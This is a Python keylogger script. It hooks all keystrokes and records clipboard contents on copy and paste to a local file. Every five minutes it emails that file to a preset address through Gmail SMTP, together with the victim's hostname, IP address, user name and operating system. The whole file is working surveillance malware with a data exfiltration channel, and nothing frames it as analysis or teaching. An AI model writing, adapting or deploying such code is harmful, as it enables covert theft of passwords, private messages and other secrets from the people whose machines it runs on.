import keyboard
import smtplib
from email.message import EmailMessage
import threading
import socket, platform, getpass, time
import pyperclip

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

words = []
ctrl_held = False
win_held = False
lock = threading.Lock()

smtp_server = 'smtp.gmail.com'
smtp_port = 587
username = 'YOUR MAIL ADDRESS'
app_pass = 'YOUR APP PASSWORD'

def is_connected():
    test_hosts = ["1.1.1.1", "8.8.8.8"]
    for host in test_hosts:
        try:
            socket.create_connection((host, 53), timeout=2)
            return True
        except OSError:
            continue
    return False

def on_press(event):
    global ctrl_held, win_held

    if event.event_type == 'down':
        if event.name in ['ctrl', 'left ctrl', 'right ctrl']:
            ctrl_held = True
        elif event.name in ['left windows', 'right windows']:
            win_held = True
    elif event.event_type == 'up':
        if event.name in ['ctrl', 'left ctrl', 'right ctrl']:
            ctrl_held = False
        elif event.name in ['left windows', 'right windows']:
            win_held = False
    else:
        return

    if ctrl_held and event.name.lower() == 'c':
        try:
            copied_text = pyperclip.paste()
            with lock:
                words.append(f"[[COPIED: {copied_text}]]")
                with open('logs.txt', 'a', encoding='utf-8') as f:
                    f.write("".join(words))
                words.clear()
        except Exception as e:
            print("Clipboard read error:", e)
        return
    
    if ctrl_held and event.name.lower() == 'v':
        try:
            pasted_text = pyperclip.paste()
            with lock:
                words.append(f"[[PASTED: {pasted_text}]]")
                with open('logs.txt', 'a', encoding='utf-8') as f:
                    f.write("".join(words))
                words.clear()
        except Exception as e:
            print("Clipboard write error:", e)
        return

    if event.event_type != 'down':
        return

    key = event.name
    with lock: 
        if key == 'space':
            words.append(" ")
        elif key == 'backspace':
            words.append("[[BACKSPACE]]")
        elif key == 'enter':
            words.append("[[ENTER]]")
        elif key == 'delete':
            words.append("[[DELETE]]")
        elif key == 'left':
            words.append("[[LEFT]]")
        elif key == 'right':
            words.append("[[RIGHT]]")
        elif key == 'up':
            words.append("[[UP]]")
        elif key == 'down':
            words.append("[[DOWN]]")
        elif key == 'home':
            words.append("[[HOME]]")
        elif key in ['ctrl', 'left ctrl', 'right ctrl', 'alt gr', 'shift', 'left shift', 'right shift', 'windows', 'left windows', 'right windows']:
            pass
        elif key == 'alt':
            words.append("[[ALT]]")
        elif key == 'end':
            words.append("[[END]]")
        elif key == 'clear':
            words.append("[[CLEAR]]")
        elif key == 'decimal':
            words.append("[[DECIMAL]]")
        elif key == 'page up':
            words.append("[[PAGE UP]]")
        elif key == 'page down':
            words.append("[[PAGE DOWN]]")
        elif key == 'insert':
            words.append("[[INSERT]]")
        elif key == 'num lock':
            words.append("[[NUM LOCK]]")
        elif key == 'tab':
            words.append("[[TAB]]")
        elif key == 'caps lock':
            words.append("[[CAPS LOCK]]")
        elif key == 'print screen':
            words.append("[[PRINT SCREEN]]")
        elif key == 'esc':
            words.append("[[ESC]]")
        elif key == 'scroll lock':
            words.append("[[SCROLL LOCK]]")
        elif key == 'pause':
            words.append("[[PAUSE]]")
        elif win_held and len(key) == 1 and key.isalpha():
            words.append(f"[[WINDOWS + {key.upper()}]]")
        elif ctrl_held and len(key) == 1 and key.isalpha():
            words.append(f"[[CTRL + {key.upper()}]]")
        elif key in [f'f{i}' for i in range(1, 13)]:
            words.append(f"[[{key.upper()}]]")
        else:
            words.append(key)

        with open('logs.txt', 'a', encoding='utf-8') as f:
            f.write("".join(words))
        words.clear()

    # print("".join(words))

def send_email():
    with lock:
        try:
            if not is_connected():
                return

            with open('logs.txt', 'rb') as f:
                dosya = f.read()

            if not dosya.strip():
                return
        
            msg = EmailMessage()
            msg['Subject'] = f'LOG! - {hostname} - {ip_address}'
            msg['From'] = username
            msg['To'] = 'EMAIL_TO_WHICH_LOGS_ARE_SENT'

            body_text = f"""
            === SYSTEM INFORMATION ===
            HOSTNAME: {hostname}
            IP ADDRESS: {ip_address}
            USER: {getpass.getuser()}
            OS: {platform.system()} {platform.release()}
            TIME: {time.ctime()}
            ==========================
            """
            msg.set_content(body_text)

            msg.add_attachment(dosya, maintype='text', subtype='plain', filename='logs.txt')

            with smtplib.SMTP(smtp_server, smtp_port) as smtp:
                smtp.starttls()
                smtp.login(username, app_pass)
                smtp.send_message(msg)

            with open('logs.txt', 'w', encoding='utf-8') as f:
                f.write('')

        except Exception as e:
            print("Error:", e)
        finally:
            threading.Timer(300, send_email).start()


threading.Timer(300, send_email).start()

keyboard.hook(on_press)
keyboard.wait()
